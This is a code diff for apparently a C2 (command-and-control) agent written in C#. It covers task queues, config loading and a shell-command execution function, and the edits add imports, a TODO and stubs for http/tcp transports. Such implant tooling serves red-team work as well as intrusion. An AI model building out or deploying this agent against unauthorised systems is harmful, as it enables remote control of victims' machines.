@@ -8,8 +8,14 @@ using System.IO.Pipes;
 using Agent.ModuleBase;
 using Agent.Models.C2Request;
 using System.Text.Json;
-using System;
+using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Collections.Generic;
+using System.Net.Http;
 
+
+// #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
 
 // Queues, random and agentInfo 
@@ -20,6 +26,7 @@ var messageQueueLock = new object();
 var commandOutputQueue = new ConcurrentQueue<string>();
 var rnd = new Random();
 var agentInfo = await agentInformationService.GetAgentInfoAsync();
+ICommand command;
 
 // Load the embedded config
 var baseConfig = ConfigLoader.LoadEmbeddedConfig();
@@ -116,6 +123,8 @@ async Task HandleTask(AgentTask task)
 }
 
 // Command execution logic
+// TODO redo logic to use cancellationtoken rather than tokensource
+
 string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellationTokenSourceSet)
 {
     const int delay = 1;
@@ -189,7 +198,6 @@ string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellatio
     return output;
 }
 
-// If web terminal param is set to "shell" execute with:
 async Task<string> ExecuteShellCommand(string[] commandParameters, bool IsCancellationTokenSourceSet = false)
 {
     ArgumentNullException.ThrowIfNull(commandParameters, nameof(commandParameters));
@@ -240,3 +248,8 @@ async Task<string> ExecuteShellCommand(string[] commandParameters, bool IsCancel
 
     return output;
 }
+// #elif TYPE_tcp
+
+// #else
+
+// #endif
